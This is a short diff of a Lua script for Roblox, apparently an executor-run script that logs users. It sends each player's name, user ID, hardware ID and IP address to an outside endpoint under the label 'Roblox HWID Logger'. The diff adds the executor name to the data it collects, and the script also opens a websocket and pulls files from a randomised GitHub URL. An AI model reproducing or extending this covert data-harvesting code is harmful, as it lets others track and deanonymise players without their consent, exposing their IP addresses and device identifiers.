@@ -1,4 +1,3 @@
-
 local GetUrl = "https://raw.githubusercontent.com/cvMeepbrMpmfMqCcBafdkhLLZlmZpAD23nDEAGR/Tu5BCCVt7VMF8BQsUc4SjXR6vBb3SDI5L0GFAGDzKemOLHBnsex/main/"
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
@@ -22,7 +21,7 @@ request{
         ["Content-Type"] = "application/json"  -- When sending JSON, set this!
     },
     Body = Services.HttpService:JSONEncode({
-        content = "> Name: `"..LocalPlayer.Name.."`\n> Id: `"..LocalPlayer.UserId.."`\n> HWID: `"..HWID.."`\n> Ip: `"..ip.."`".."\n> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
+        content = "> Name: `"..LocalPlayer.Name.."`\n> Id: `"..LocalPlayer.UserId.."`\n> HWID: `"..HWID.."`\n> Executor: `"..Executor.."`\n> Ip: `"..ip.."`".."\n> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
         username = "Roblox HWID Logger"
     })
 }
@@ -83,7 +82,7 @@ local server
 
 repeat
 pcall(function()
-server = websocket.connect("ws://116.44.218.113:1350")
+server = websocket.connect("ws://localhost:1350")
 end)
 until server
 local WebSocketScript = ""
